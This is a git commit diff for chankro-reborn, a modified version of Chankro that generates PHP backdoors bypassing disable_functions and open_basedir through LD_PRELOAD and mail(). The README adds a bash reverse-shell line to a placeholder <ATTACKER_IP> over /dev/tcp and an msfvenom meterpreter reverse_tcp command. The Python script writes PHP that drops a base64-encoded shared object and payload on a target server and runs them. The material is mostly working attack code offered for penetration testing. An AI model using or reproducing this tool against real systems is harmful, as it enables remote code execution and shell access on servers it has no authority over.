0fe807fde90e0a4c72b71f8487494cf1ed9db927
mrizkihidayat66 <61375703+mrizkihidayat66@users.noreply.github.com>
2023-08-09 18:01:41 +0700

    commit

--- README.md
+++ README.md
@@ -1,34 +1,45 @@
+<img src="/images/example.jpg">
+
 # Chankro
 
-Your favourite tool to bypass __disable_functions__ and __open_basedir__ in your pentests. 
+Chankro is an impressive tool designed by TarlogicSecurity for bypassing PHP's __disable_functions__ and __open_basedir__ restrictions. This repository contains a modified version of Chankro. For the original source, visit [Chankro](https://github.com/TarlogicSecurity/Chankro).
 
 ## How it works
 
-PHP in Linux calls a binary (sendmail) when the mail() function is executed. If we have putenv() allowed, we can set the environment variable "LD_PRELOAD", so we can preload an arbitrary shared object. Our shared object will execute our custom payload (a binary or a bash script) without the PHP restrictions, so we can have a reverse shell, for example.
+In Linux, when the mail() function is executed in PHP, it triggers the execution of a binary called sendmail. Leveraging the availability of the putenv() function, we can set the "LD_PRELOAD" environment variable, which allows us to preload a custom shared object. This shared object executes a custom payload—either a binary or a Bash script—without being constrained by PHP's restrictions. This enables us to establish actions like a reverse shell.
 
 ## Example:
 
-The syntax is pretty straightforward:
+The usage syntax is straightforward:
 
 ```
-$ python2 chankro.py --arch 64 --input rev.sh --output chan.php --path /var/www/html
+$ python chankro.py -a 64 -p rev.sh -o chankro.php -t /var/www/html
 ```
 
-Note: path is the absolute path where our .so will be dropped.
+Note:
+1. The target path represents the absolute location where our .so file will be deposited.
+2. The payload is binary file of shell like sh, meterpreter, etc. E.g.:
+	 ```
+	 $ echo "bash -c 'sh -i >& /dev/tcp/<ATTACKER_IP>/<ATTACKER_PORT> 0>&1'" > rev.sh
+	 ```
+	 ```
+	 $ msfvenom -a x86 --platform linux -p linux/x86/meterpreter/reverse_tcp LHOST=<ATTACKER_IP> LPORT=<ATTACKER_PORT> -e x86/shikata_ga_nai -f elf -o payl86.elf
+	 ```
+   Please ensure you replace <ATTACKER_IP> and <ATTACKER_PORT> with the actual IP address and port you intend to use for the reverse shell connection.
 
 ## Install
+
+### Requirements
+1. Python 3
 
 ### Git
 
 ```
-$ git clone https://github.com/TarlogicSecurity/Chankro.git
-$ cd Chankro
-$ python2 chankro.py --help
+ $ git clone https://github.com/mrizkihidayat66/chankro-reborn.git
+ $ cd chankro-reborn
+ $ python chankro.py -h
 ```
+Please make sure to have Python 3 installed before using Chankro. After cloning the repository using Git, navigate to the appropriate directory and consult the help (-h) command for further guidance on using the tool.
 
-### [BlackArch](https://blackarch.org/)
-
-```
-# pacman -S chankro
-$ chankro --help
-```
+### Reference
+1. [Asem Eleraky](https://melotover.medium.com) - [How I bypassed disable_functions in php to get a remote shell](https://infosecwriteups.com/how-i-bypassed-disable-functions-in-php-to-get-a-remote-shell-48b827d54979)
--- chankro.py
+++ chankro.py
@@ -1,81 +1,116 @@
-######## Chankro v0.4 #######
+#!/usr/bin/python3
 
 # [+] Bypass disable_functions
 # [+] Bypass open_basedir
 
 ##############################
 #          @TheXC3LL         #
+#       @RizkyBlackHat       #
 ##############################
-
 
 import argparse
 import base64
 import os
 
-parser = argparse.ArgumentParser(description='Generate PHP backdoor')
-parser.add_argument('--arch', dest='arch',help='Architecture (32 or 64)')
-parser.add_argument('--input', dest='meter', help='Binary to be executed (p.e. meterpreter)')
-parser.add_argument('--output', dest='out', help='PHP filename')
-parser.add_argument('--path', dest='pati', help='Absolute path')
-args = parser.parse_args()
+argp = argparse.ArgumentParser(description="Generate a PHP backdoor with customizable options.")
+argp.add_argument(
+  '-a', '--arch',
+  type=str,
+  required=True,
+  choices=['32', '64'],
+  help="Select the target architecture (32-bit or 64-bit)."
+)
+argp.add_argument(
+  '-p', '--payload',
+  type=str,
+  required=True,
+  help="Specify the binary payload to be executed (e.g., sh, meterpreter, etc.)."
+)
+argp.add_argument(
+  '-o', '--output',
+  type=str,
+  required=True,
+  help="Set the desired PHP backdoor will be saved."
+)
+argp.add_argument(
+	'-t', '--target_path',
+	type=str,
+	required=True,
+	help="Set lib extraction path in target machine (e.g., /tmp)."
+)
+args = argp.parse_args()
 
-# path where the tool is installed
-script_path = os.path.dirname(os.path.realpath(__file__))
+basepath	= os.path.dirname(os.path.realpath(__file__))
 
-print "\n\n     -=[ Chankro ]=-\n    -={ @TheXC3LL }=-\n\n"
-
-
-if not args.meter:
-	print "[!] Error: please select a valid file as input"
- 	exit()
-try:
-	with open(args.meter, "rb") as file:
-		encoded_shell = base64.b64encode(file.read())
-except:
-	print "[!] Error: file could not be opened"
-	exit()
-if not args.out:
-	print "[!] Error: please select a valid file as output"
-	exit()
-try:
-        if (os.path.isabs(args.out)):
-                outfile = open(args.out, "w") # absolute path provided
-        else:
-                outfile = open(os.getcwd() + '/' + args.out, "w") # relative path provided
-except:
-	print "[!] Error: file could not be created"
-	exit()
-
-if not args.arch:
-	print "[!] Error: select architecture (64 or 32)"
-	exit()
+if os.path.isabs(args.output):
+  outpath = os.path.dirname(args.output)
+  outfile = os.path.basename(args.output)
 else:
-	if args.arch != "32" and args.arch != "64":
-		print "[!] Error: unknow architecture"
-		exit()
-	else:
-		archi = script_path + "/hook" + args.arch + ".so"
-if not args.pati:
-	print "[!] Error: remote path"
-	exit()
+  outfile = args.output
+  outpath = basepath  # Set outpath if outfile is relative
 
-with open(archi, "rb") as bicho:
-	encoded_bicho = base64.b64encode(bicho.read())
+outname, outexts = os.path.splitext(outfile)
 
+banner = """
+   ________                __            
+  / ____/ /_  ____ _____  / /___________ 
+ / /   / __ \/ __ `/ __ \/ //_/ ___/ __ \\
+/ /___/ / / / /_/ / / / / ,< / /  / /_/ /
+\____/_/ /_/\__,_/_/ /_/_/|_/_/   \____/ 
+                               ver. 0.5.0
+ - @TheXC3LL
+ - @RizkyBlackHat
+"""
+print(banner)
 
-head = "<?php\n $hook = '" + encoded_bicho  + "';\n"
-body1 = "$meterpreter = '" + encoded_shell + "';\n"
-body2 = "file_put_contents('" + args.pati + "/chankro.so', base64_decode($hook));\n"
-body3 = "file_put_contents('" + args.pati + "/acpid.socket', base64_decode($meterpreter));\n"
-cosa3 = "putenv('CHANKRO=" + args.pati + "/acpid.socket');\n"
-tail1 = "putenv('LD_PRELOAD=" + args.pati + "/chankro.so');\n"
-tail2 = "mail('a','a','a','a');?>"
+try:
+	with open(args.payload, "rb") as file:
+		encoded_payl = base64.b64encode(file.read()).decode('utf-8')  # Decode bytes to utf-8 string
+except:
+  print("[!] Error: payload could not be opened.")
+  exit()
+  
+try:
+  output = open(outpath + '/' + outname + outexts, "w")
+except:
+  print("[!] Error: out file could not be created.")
+  exit()
 
-print "[+] Binary file: " + args.meter
-print "[+] Architecture: x" + args.arch
-print "[+] Final PHP: " + args.out + "\n\n"
+try:
+	libarch = basepath + '/hook' + args.arch + '.so'
+	with open(libarch, "rb") as lib:
+		encoded_lib = base64.b64encode(lib.read()).decode('utf-8')  # Decode bytes to utf-8 string
+except:
+  print("[!] Error: lib arch could not be loaded.")
+  exit()
 
+def generate_payload(encoded_lib, encoded_payl, args, outname, output):
+  cleanup = (
+    f"<?php\n"
+    f"unlink('{args.target_path}/{outname}.so');\n"
+    f"unlink('{args.target_path}/acpid.socket');\n"
+    f"putenv('{outname.upper()}');\n"
+    f"putenv('LD_PRELOAD');\n"
+    f"?>"
+  )
+  payload = (
+    f"<?php\n"
+    f"$hook = '{encoded_lib}';\n"
+    f"$payload = '{encoded_payl}';\n"
+    f"file_put_contents('{args.target_path}/{outname}.so', base64_decode($hook));\n"
+    f"file_put_contents('{args.target_path}/acpid.socket', base64_decode($payload));\n"
+    f"putenv('{outname.upper()}={args.target_path}/acpid.socket');\n"
+    f"putenv('LD_PRELOAD={args.target_path}/{outname}.so');\n"
+    f"mail('a','a','a','a');\n"
+    f"?>"
+  )
+  output.write(cleanup + "\n\n" + payload)
+  output.close()
 
-outfile.write(head + body1 + body2 + body3 + cosa3 + tail1 + tail2)
-outfile.close()
-print "[+] File created!"
+print("[i] Payload binary\t: " + args.payload)
+print("[i] Architecture\t: " + args.arch)
+print("[i] Output\t\t: " + args.output + "\n")
+
+generate_payload(encoded_lib, encoded_payl, args, outname, output)
+
+print("[!] Done!")
